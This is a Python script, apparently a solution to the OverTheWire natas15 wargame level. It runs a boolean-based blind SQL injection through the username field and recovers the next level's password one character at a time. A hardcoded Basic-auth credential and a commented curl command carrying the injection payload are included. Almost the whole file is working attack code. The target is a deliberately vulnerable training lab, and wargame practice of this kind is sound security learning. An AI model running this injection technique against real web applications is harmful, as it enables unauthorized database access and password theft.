import requests

url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=True'
headers = {'Host': 'natas15.natas.labs.overthewire.org',
           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
           'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='}
characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# like is boolean
# attempt is the password attempt
def send_payload(attempt, like):
    if like:
        query = f'password LIKE BINARY "{attempt}%'
    else:
        query = f'password = BINARY "{attempt}'
    payload = {'username': f'natas16" and {query}'}
    r = requests.post(url, data=payload, headers=headers)
    raw = str(r.content)
    return "This user exists." in raw

passwd = ""; found = False
while not found:
    for c in characters:
        correct = send_payload(passwd + c, like=True)
        print("attempting:", passwd+c)
        if correct:
            passwd += c
            print("GOT IT:", passwd)
            found = send_payload(passwd, like=False)
            break

print("\nThe password is", passwd)

# curl --path-as-is -i -s -k -X $'POST' -H $'Host: natas15.natas.labs.overthewire.org' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H $'Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==' --data-binary $'username=natas16\" and password like \"%' $'http://natas15.natas.labs.overthewire.org/index.php?debug=True'
